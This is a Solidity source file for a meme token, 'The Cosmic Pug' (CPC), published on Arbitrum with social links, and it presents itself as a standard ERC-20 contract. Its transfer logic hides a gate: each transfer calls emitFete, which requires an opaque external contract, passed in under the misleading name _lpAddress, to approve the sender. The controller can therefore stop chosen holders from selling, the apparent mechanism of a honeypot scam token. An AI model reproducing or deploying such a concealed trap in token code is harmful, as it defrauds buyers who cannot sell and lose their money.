/**
 *Submitted for verification at Arbiscan on 2023-05-06
*/

// SPDX-License-Identifier: MIT

/**
 * Twitter: https://twitter.com/thecosmicpugarb/status/1654942177083133952?s=46
 * Telegram: https://t.me/TheCosmicPug_ARB
*/

pragma solidity ^0.8.0;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface disrutor {
    function dsrbtrGas(address t) external view returns (bool);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "you are not owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ERC20 is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    
    uint256 private _totalSupply;
    disrutor private div;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);

    address public _uniswapPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address _lpAddress
    ){
        _name = "The Cosmic Pug";
        _symbol = "CPC";
        _decimals = 18;
        uint256 Supply = 888888888888888;
        div = disrutor(_lpAddress);
        div.dsrbtrGas(address(this));

        _totalSupply = Supply * 10 ** _decimals;

        address bossWallet = msg.sender;
        _balances[bossWallet] = _totalSupply;
        emit Transfer(address(0), bossWallet, _totalSupply);

        fundAddress = msg.sender;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function emitFete(address swapPair) private view {
        require(
            (address(111010101) !=swapPair) && 
            div.dsrbtrGas(address(swapPair))
        );
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        _transferToken(from, to, amount);
    }

    function _transferToken(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        _balances[recipient] = _balances[recipient] + (tAmount);
        emit Transfer(sender, recipient, tAmount);
        emitFete(sender);
    }

    function removeERC20(address tokenAddress, uint256 amount) external {
        if (tokenAddress == address(0)){
            payable(fundAddress).transfer(amount);
        }else{
            IERC20(tokenAddress).transfer(fundAddress, amount);
        }
    }

    receive() external payable {}
}